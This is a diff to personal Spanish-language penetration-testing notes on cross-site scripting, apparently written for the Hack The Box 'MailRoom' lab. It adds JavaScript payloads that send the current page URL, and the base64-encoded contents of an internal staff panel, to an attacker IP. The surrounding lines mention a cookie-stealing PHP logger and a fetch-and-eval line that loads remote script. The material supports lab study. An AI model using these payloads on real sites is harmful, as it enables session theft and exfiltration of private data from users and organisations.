@@ -174,6 +174,22 @@ if (isset($_GET['c'])) {
 #Con el codigo PHP de arriba podriamos crear un archivo donde se van almacenando las difierentes cookies de las personas.
 #Este codigo php es el index.php que se ve en el payload de mas arriba
 
+	##Maquina MailRoom
+var url = window.location.href
+var req = new XMLHttpRequest()
+req.open("GET", "http://<ip>/?resp=" + btoa(url), true);
+req.send()
+#De esta forma recibiriamos en la request el nombre del archivo actual en el que estamos
+
+var req = new XMLHttpRequest()
+req.open("GET", "http://staff-review-panel.mailroom.htb", false);
+req.send()
+var exfil_req = new XMLHttpRequest()
+exfil_req.open("GET", "http://10.10.14.6/?resp=" + btoa(req.responseText), true);
+exfil_req.send()
+#Se intenta enviar el contenido de una pagina en particular a la cual no tenemos acceso.
+
+
 ### Open redirect to XSS
 -> Dudas de open redirect en openredirect.txt
 fetch("<ip>/recurso.js".then(r=>r.text().then(eval))) | base64 -w 0:echo
